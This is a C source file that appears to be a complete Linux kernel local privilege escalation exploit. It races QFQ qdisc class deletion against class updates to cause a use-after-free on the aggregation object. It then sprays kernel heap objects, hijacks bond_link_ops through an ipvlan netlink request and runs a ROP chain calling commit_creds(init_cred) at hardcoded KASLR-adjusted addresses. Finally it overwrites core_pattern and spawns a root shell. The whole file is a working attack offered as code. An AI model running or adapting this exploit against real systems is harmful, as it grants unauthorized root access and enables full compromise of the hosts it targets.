#include <libx.h>
#include <time.h>
#include <keyutils.h>
#include <linux/rtnetlink.h>
#include <linux/if_arp.h> 
#include <sys/time.h>
#define DONICE 1
u64 kaslr = 0;
void getShell(){
    success("PWN");
    int fd = open("/proc/sys/kernel/core_pattern",2);
    write(fd,"|/proc/%P/fd/666\0",18);
    close(fd);
    system("/bin/sh");
}
void nperm(){
    sandbox();
    saveStatus();
    size_t rdi               = 0xffffffff81b8e296 - NO_ASLR_BASE + kaslr;
    size_t sysret            = 0xffffffff8240021a - NO_ASLR_BASE + kaslr;
    size_t gadget            = 0xffffffff8101e4c0 - NO_ASLR_BASE + kaslr;
    size_t r11_rcx           = 0xffffffff822b5ed5 - NO_ASLR_BASE + kaslr;    
    size_t addr_pay          = 0xffffffff84697000 - NO_ASLR_BASE + kaslr;
    size_t init_cred         = 0xffffffff83a75f00 - NO_ASLR_BASE + kaslr;
    size_t commit_creds      = 0xffffffff811d4510 - NO_ASLR_BASE + kaslr;
    size_t ctx[0x200]        = {};
    size_t ct                = 0 ; 
    ctx[ct++] = 0x6e616c767069; // str 
    ct = 10;
    ctx[ct++] = addr_pay;
    ctx[ct++] = 0;
    ctx[ct++] = 1;
    ctx[ct++] = 2;
    ctx[ct++] = 0;
    ctx[ct++] = 0;
    ctx[ct++] = 0;
    ctx[ct++] = rdi;
    ctx[ct++] = init_cred;
    ctx[ct++] = commit_creds;
    ctx[ct++] = r11_rcx;
    ctx[ct++] = user_rflags;
    ctx[ct++] = getShell;
    ctx[ct++] = rdi;
    ctx[ct++] = gadget;
    ctx[ct++] = sysret;
    ctx[ct++] = user_sp|8;
    pgvAdd(1,9,0x610);
    size_t  to_allocate = 0x1000*0x10;
    for(int i = 0 ; i < to_allocate; i+=1){
        size_t addr = mmap(0,0x1000,0x6,0x21,-1,0);
        if( addr == -1 ) break;
        memcpy(addr,ctx,sizeof(ctx));
    }
    pgvDel(1);
}
/* LL ATK */
void LL_ATK() {
    // Trig Function: __rtnl_newlink
    struct {
        struct nlmsghdr nh;
        struct ifinfomsg ifi;
        char buf[1024];
    } req;

    struct rtattr *rta;
    int sock;
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };

    // Create a netlink socket
    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (sock < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&req, 0, sizeof(req));

    // Netlink message header
    req.nh.nlmsg_len = NLMSG_LENGTH(sizeof(req.ifi));
    req.nh.nlmsg_type = RTM_NEWLINK;
    req.nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;

    // Interface info
    req.ifi.ifi_family = AF_UNSPEC;

    // Add VLAN attributes
    rta = (struct rtattr *)(((char *)&req) + NLMSG_ALIGN(req.nh.nlmsg_len));
    rta->rta_type = IFLA_LINKINFO;
    rta->rta_len = RTA_LENGTH(0);

    struct rtattr *rta_data = (struct rtattr *)(((char *)rta) + RTA_ALIGN(rta->rta_len));
    rta_data->rta_type = IFLA_INFO_KIND;
    rta_data->rta_len = RTA_LENGTH(strlen("ipvlan") + 1);
    strcpy((char *)RTA_DATA(rta_data), "ipvlan");

    rta->rta_len = RTA_ALIGN(rta->rta_len) + RTA_ALIGN(rta_data->rta_len);

    req.nh.nlmsg_len = NLMSG_ALIGN(req.nh.nlmsg_len) + RTA_ALIGN(rta->rta_len);

    write(sock,&req, req.nh.nlmsg_len);
    return 0;
}
/* Global Vars*/
u32 targetClass = 0x20001;
int nl, inet_sock_fd;
int xdp_fd[0x200] ={};
size_t key_store[0x100] = {};
char *trash;
struct schedAttr attrL[1] = {};

/* Global Vars for msg related */
char *  del1;
char *  del2;
char *  del3;
char *  del4;
char *  msgQdiscCreate;
char *  tclass_0x20001_create;
char *  tclass_0x20001_update;
char *  tclass_0x20002_create;
char *  tclass_0x20003_create;
char *  tclass_0x20004_create;
char *  msgQdiscClass_upgrade;
char *  classAddMsg[0x40]={}; // warm up messages
char *  spray_obj[0x200]={}; // warm up messages
char *  partial_slab_obj[0x200]={}; // warm up messages
void *  munmap_list[0x200] = {}; // spray obj -> xdp umem
size_t  payload[0x10]={};
/* Race Exp */
void handler(int sig) {}
void setNice(int val){
    if(DONICE)
        setpriority(PRIO_PROCESS, 0, val);  // set nice = 5 for this thread only
}
int interrupter(){
    unsigned long int tmp;
    pinCPU(1); // Make sure we are on the same CPU as del
    setNice(-20);
    signal(SIGALRM, handler);
    struct itimerval t = {
        .it_interval = {0, 13},  // 1 µs
        .it_value = {0, 13}
    };
    setitimer(ITIMER_REAL, &t, 0);
    while(1) pause();
}
/* Card Shark */
u8 flag1, flag2, flag3,stop;
size_t racer_delay = 0;
size_t racee_delay = 0 ;
static void delay(size_t n){
  size_t end;
  end = rdtsc()+n;
  while(rdtsc()<end);
  return;
}
void thr_racee(){
    setNice(19);
    flag1 = 1;
    stop = 0 ;
    while(!flag3);
    delay(racee_delay);
    // CPU 1
    NLMsgSend(nl,del1); // del -> dec;
    stop = 1;
}
void thr_racer(){
    setNice(-20);
    flag2 = 1;
    while(!flag3);
    delay(racer_delay);
    // CPU 0
    write(inet_sock_fd, "", 0x400-42); // upgrade
    while(!stop){
        NLMsgSend(nl,tclass_0x20002_create); // change it back
        write(inet_sock_fd, "", 0x400-42); // upgrade
    }
}
void race_attemp(){
    unsigned long int thrs[2];
    pinCPU(1);
    pthread_create(&thrs[0],0,thr_racee,0);
    pinCPU(0);
    pthread_create(&thrs[1],0,thr_racer,0);
    while(!flag1 || !flag2);
    flag3 = 1;
    pthread_join(thrs[0],0);
    pthread_join(thrs[1],0);
}
void cardshark(long long align_time){
    flag1 = flag2 = flag3 = 0;
    if(align_time  > 0 )
      racer_delay = align_time;
    else
      racee_delay = -align_time;
    race_attemp();
}
/* Prepared Values*/
void init_loopbacksend (u32 prio) {
    struct sockaddr iaddr = { AF_INET };
    inet_sock_fd = socket(PF_INET, SOCK_DGRAM, 0);
    int res = setsockopt(inet_sock_fd, SOL_SOCKET, SO_PRIORITY, &prio, sizeof(prio));
    connect(inet_sock_fd, &iaddr, sizeof(iaddr));
}
void initContext(){
    trash = calloc(1,0x1000);
    memset(trash,'i',0x1000);
    msgQdiscCreate =        qfqQdiscAdd(targetClass>>16<<16,-1);
    tclass_0x20001_create = qfqClassAdd(TCA_QFQ_LMAX,0x20001,0x200);
    tclass_0x20002_create = qfqClassAdd(TCA_QFQ_LMAX,0x20002,0x200);
    tclass_0x20003_create = qfqClassAdd(TCA_QFQ_LMAX,0x20003,0x400);
    tclass_0x20004_create = qfqClassAdd(TCA_QFQ_LMAX,0x20004,0x400);
    msgQdiscClass_upgrade = qfqClassAdd(TCA_QFQ_LMAX,0x20002,0x400);
    tclass_0x20001_update = qfqClassAdd(TCA_QFQ_LMAX,0x20001,0x400);
    del1 = classDel(0x20001);
    del2 = classDel(0x20002);
    del3 = classDel(0x20003);
    del4 = classDel(0x20004);

    for(int i = 0; i < 0x20 ; i++){
      classAddMsg[i]      = qfqClassAdd(TCA_QFQ_LMAX,0x21000+i,0x500);
      classAddMsg[i+0x20] = classDel(0x21000+i);
    }
    for(int i = 0; i < 0x80 ; i++){
      spray_obj[i]         = qfqClassAdd(TCA_QFQ_LMAX,0x20000+i+0x10,0x500);
      spray_obj[i+0x80]    = qfqClassAdd(TCA_QFQ_LMAX,0x20000+i+0x10,0x510+0x10*i);
      spray_obj[i+0x100]   = classDel(0x20000+i+0x10);
    }
    for(int i = 0 ;i< 8; i++)
    {
      partial_slab_obj[i]       = qfqClassAdd(TCA_QFQ_LMAX,0x20000+i+0x100,0x500);
      partial_slab_obj[i+8]     = qfqClassAdd(TCA_QFQ_LMAX,0x20000+i+0x100,0x410+i*0x10);
      partial_slab_obj[i+0x10]  = classDel(0x20000+i+0x100);
    }
    // Init Payload
    size_t ll_target    = 0xffffffff83d87900 - NO_ASLR_BASE + kaslr; // bond_link_ops
    size_t nperm_addr   = 0xffffffff84697040 - NO_ASLR_BASE + kaslr;
    memset(payload,0,sizeof(payload));
    payload[0] = 1;
    payload[1] = 2;
    payload[5] = 0x30000000001;
    payload[6] = 0x30000000000;
    payload[7] = 0x30000000300;
    payload[8] = 1;
    payload[11] = nperm_addr;
    payload[12] = ll_target;
}
void warm(){
    for(int i = 0; i < 0x20; i++)
        NLMsgSend(nl,classAddMsg[i]); // del -> dec;
    for(int i = 0 ; i < 0x100 ; i ++)
        write(inet_sock_fd, "", 0x200-42); // warmup
    for(int i = 0x20; i < 0x40; i++)
        NLMsgSend(nl,classAddMsg[i]); // del -> dec;
}
/* Exploitation after bug is triggered*/
void exp(){
    // Exploitation starts
    // We assume the refcnt of the agg is now 2, it could be 4 or 3 (not exploitable)
    /*
        qfq_agg -> refcnt:
         2 (vul)
         4 (vul but not exploitable)
         3 normal
        qfq_qdisc: 0x20000 
        (Deleted) qfq_class 0x20001  -> lmax 0x400 
        (Active)  qfq_class 0x20002  -> lmax 0x400 
        (Active)  qfq_class 0x20003  -> lmax 0x400
        (Active)  qfq_class 0x20004  -> lmax 0x400
    */
    for(int i = 0 ; i < 0x80 ; i++)
        NLMsgSend(nl,spray_obj[i+0x100]);
    for(int i = 0 ; i < 8 ; i++)
        NLMsgSend(nl,partial_slab_obj[i+0x10]);
    NLMsgSend(nl,del2);
    
    NLMsgSend(nl,del3);
    pgvDel(1);
    pgvDel(0);
    pgvAdd(1,0,0x100);
    char * res = pgvMap(1); // map the page
    for(int i = 0 ; i < 0x100 ; i ++)
        for(int k = 0 ; k < 0x20 ; k++)
            memcpy(res+i*0x1000+k*0x80,payload,0x80);
    NLMsgSend(nl,del4); // UAF free 2 LL ATK
    LL_ATK(); // win 
    pgvDel(1);
}
size_t cardprobe(int item){
    size_t start,end;
    pinCPU(item);
    if(item == 0){
        sched_yield();
        start = rdtsc();
        write(inet_sock_fd, "", 0x400-42); 
        end = rdtsc();
    }
    else if(item == 1){
        sched_yield();
        start = rdtsc();
        NLMsgSend(nl,del1); 
        end = rdtsc();
    }
    return end - start;
}
void probe(u64 nudge){
    pinCPU(0);
    sandbox();
    impLimit();
    int res = syz_net_reset();
    for(int i = 0 ; i < 0x100; i++)
        xdp_fd[i] = xdpInit();
    init_loopbacksend(0x20002);
    nl = initNL();
    pgvAdd(1,0,0x40);
    pgvAdd(0,4,2);
    msgSpray_t * df1 = msgSpray(0x80-0x30,0x200,trash);
    NLMsgSend(nl,msgQdiscCreate);
    for(int i = 0 ; i < 8;i++)
        NLMsgSend(nl,partial_slab_obj[i]);
    for(int k = 0 ; k < 8; k++)
    {
        NLMsgSend(nl,partial_slab_obj[k+8]);
        for(int i = 0 ; i < 0x20; i++ )
            munmap_list[i+k*0x20] = xdpUmemAdd(xdp_fd[i+k*0x20], 0x1000); 
    }

    NLMsgSend(nl,tclass_0x20001_create); // 0x20001 -> 0x200
    NLMsgSend(nl,tclass_0x20002_create); // 0x20002 -> 0x200
    for(int i = 0 ; i < 0x80 ; i++)
        NLMsgSend(nl,spray_obj[i]);
    for(int i = 0 ; i < 0x40; i++)
        NLMsgSend(nl,spray_obj[i+0x80]);
    NLMsgSend(nl,tclass_0x20001_update);
    for(int i = 0x40 ; i < 0x80; i++)
        NLMsgSend(nl,spray_obj[i+0x80]);

    NLMsgSend(nl,tclass_0x20003_create); // 3
    NLMsgSend(nl,tclass_0x20004_create); // 4 

    warm();
    sched_yield();
    // res = cardprobe(0);
    // printf("%d\n",res);
    // debug();
    cardshark(nudge);
    exp();

OUT:
    msgSprayClean(df1);
    exit(0);
}
 /* Main*/
#define N_THREADS 1
void NPERM(){
    int pid =fork();
    if(pid==0){
        nperm();
        exit(0);
    }
    waitpid(pid,0,0);
}
int main(int argc, char *argv[]){
    // shell();
    COREHEAD(argv);
    kaslr = get_kaslr_precise(0)-0x2000000;
    NPERM();
    if (fork() == 0) 
    {
        pinCPU(1);
        setsid();
        crash(666,"/tmp/exp");
    }
    initContext();
    unsigned long int thrs;
    pthread_create(&thrs, 0, interrupter, 0);
    while(1){
    for(int i = -790; i < -630 ; i+=1){
        printf("%d\n",i);
        for(int k = 0 ; k < 10; k++){
            int pid = fork() ;
            if(pid==0)
                probe(1700+85+i*10);
            else{
                u64 st;
                waitpid(pid,&st,0);
            }
        }
    }
    }

}

